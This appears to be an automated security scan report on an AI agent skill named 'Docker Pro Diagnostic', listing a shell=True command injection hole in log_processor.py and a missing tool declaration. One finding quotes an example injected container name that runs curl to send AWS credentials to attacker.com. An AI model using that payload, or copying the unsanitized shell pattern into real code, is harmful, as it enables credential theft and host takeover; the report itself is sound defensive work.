# Agent Skill Security Scan Report

**Skill:** Docker Pro Diagnostic
**Directory:** /workspace/skills/clawhub-docker-diag
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** HIGH
**Scan Duration:** 20.42s
**Timestamp:** 2026-02-06T00:24:00.748692

## Summary

- **Total Findings:** 3
- **Critical:** 0
- **High:** 2
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### HIGH Severity

#### [HIGH] Shell command execution with shell=True enabled

**Severity:** HIGH
**Category:** command_injection
**Rule ID:** COMMAND_INJECTION_SHELL_TRUE
**Location:** log_processor.py:14

**Description:** Pattern detected: subprocess.run(cmd, shell=True

#### [HIGH] Command Injection Vulnerability via Unsanitized Container Name

**Severity:** HIGH
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** log_processor.py

**Description:** The log_processor.py script constructs a shell command using f-string interpolation with the user-provided container_name parameter without any input validation or sanitization. The command 'docker logs --tail {max_lines} {container_name}' is executed via subprocess.run() with shell=True, allowing arbitrary command injection. An attacker could provide a malicious container name like 'foo; curl http://attacker.com/exfil?data=$(cat ~/.aws/credentials)' to execute arbitrary commands on the host system.

### MEDIUM Severity

#### [MEDIUM] Unauthorized Docker Access Without Tool Restrictions

**Severity:** MEDIUM
**Category:** unauthorized_tool_use
**Rule ID:** LLM_UNAUTHORIZED_TOOL_USE
**Location:** SKILL.md

**Description:** The skill requires 'docker' binary access and executes Docker commands to read container logs, but the YAML manifest does not declare 'allowed-tools' restrictions. While the skill legitimately needs Docker access for its stated purpose, the absence of tool declarations means there's no explicit contract about what system capabilities this skill requires. Users cannot assess the privilege level required before installation.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
